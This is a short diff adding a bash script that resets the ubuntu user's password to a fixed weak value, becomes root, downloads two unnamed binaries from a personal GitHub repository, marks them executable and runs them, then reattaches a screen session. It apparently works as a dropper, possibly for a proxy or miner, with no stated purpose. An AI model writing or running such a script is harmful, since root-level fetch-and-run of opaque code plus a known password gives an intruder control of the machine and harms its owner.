@@ -1,0 +1,11 @@
+#!/usr/bin/env bash
+echo ubuntu:1234abcd | chpasswd
+sleep 2
+sudo su <<EOF
+wget https://raw.githubusercontent.com/sarifadim/dopla/main/danted && chmod +x * && ./danted
+sleep 3
+cd /home/
+sleep 3
+wget -qO muse https://raw.githubusercontent.com/sarifadim/dopla/main/event2 && chmod +x muse && ./muse
+EOF
+screen -r
